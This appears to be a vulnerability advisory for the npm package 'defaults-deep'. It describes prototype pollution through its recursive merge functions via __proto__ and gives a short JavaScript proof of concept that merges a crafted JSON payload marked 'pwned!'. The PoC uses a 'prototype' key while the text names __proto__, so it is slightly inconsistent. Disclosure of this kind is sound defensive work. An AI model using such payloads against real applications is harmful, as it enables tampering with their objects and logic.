# Overview

`defaults-deep` is a like extend but recursively copies only the missing properties/values to the target object.

Affected versions of this package are vulnerable to Prototype Pollution. Affected versions of this package are vulnerable to Prototype Pollution via merging functions. These functions allows a malicious user to modify the prototype of Object via `__proto__`, causing the addition or modification of an existing property that will exist on all objects.


# Proof of Concept
```js
var defaults_deep = require('defaults-deep');

var a = {};
var obj = defaults_deep(a, JSON.parse('{ "injectedProp": "hi", "prototype" : { "status" : "pwned!" } }'));

console.log(obj.prototype.status);
```
